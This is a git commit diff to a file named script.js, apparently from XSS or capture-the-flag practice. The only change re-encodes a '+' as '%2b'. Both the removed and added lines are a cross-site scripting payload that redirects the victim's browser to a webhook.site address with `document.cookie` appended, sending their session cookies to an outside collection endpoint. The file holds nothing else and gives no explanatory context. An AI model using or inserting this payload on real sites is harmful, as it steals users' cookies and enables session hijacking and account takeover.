8229664808a91edb5ddb9f9688d4a89e3cdcf3cb
ssongK <73736882+ssongK@users.noreply.github.com>
2022-11-17 13:26:26 +0900

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
-location.href="https://webhook.site/95b45758-1485-4f9f-a44c-477ffc3c0ca4?"+document.cookie;
+location.href="https://webhook.site/95b45758-1485-4f9f-a44c-477ffc3c0ca4?"%2bdocument.cookie;
 
